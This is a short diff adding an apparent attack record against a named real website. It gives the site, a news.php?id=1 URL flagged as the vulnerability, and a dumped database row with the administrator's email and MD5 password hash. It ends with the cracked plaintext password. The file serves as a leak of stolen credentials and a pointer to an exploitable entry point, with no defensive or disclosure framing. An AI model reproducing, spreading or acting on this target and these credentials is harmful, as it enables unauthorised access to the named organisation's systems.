@@ -1,0 +1,11 @@
+web-site: www.dtl.com.sg
+vulnerability: http://www.dtl.com.sg/news.php?id=1
+panel:
+
+Dumped:
++--------------------+----------+---------------+----------------------------------+--------+
+| email              | lastname | nickname      | password                         | status |
++--------------------+----------+---------------+----------------------------------+--------+
+| enquiry@dtl.com.sg | -        | Administrator | 5f4dcc3b5aa765d61d8327deb882cf99 | 1      |
++--------------------+----------+---------------+----------------------------------+--------+
+Hash cracked: "password"
